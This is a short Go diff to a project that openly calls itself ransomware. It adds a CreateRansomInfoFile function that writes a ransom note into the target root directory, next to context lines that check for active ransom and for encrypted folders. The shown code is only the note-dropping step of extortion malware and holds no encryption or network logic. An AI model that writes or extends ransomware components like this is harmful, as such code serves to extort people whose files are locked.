@@ -34,6 +34,22 @@ func (rw *Ransomware) CheckIfActiveRansom() error {
 	return nil
 }
 
+// CreateTextFiles is responsible for creating the  ransom.txt. The message
+// is taken as a parameter since it makes the main file look more clear and configurable.
+func (rw *Ransomware) CreateRansomInfoFile(message string) error {
+	file, err := os.Create(rw.RootDir + "/ransom.txt")
+	if err != nil {
+		return errors.New("could not create ransom.txt file: " + err.Error())
+	}
+	defer file.Close()
+
+	if _, err := file.WriteString(message); err != nil {
+		return errors.New("could not write message to file: " + err.Error())
+	}
+
+	return nil
+}
+
 func checkIfEncrypted(path string) bool {
 	files, err := ioutil.ReadDir(path)
 	if err != nil {
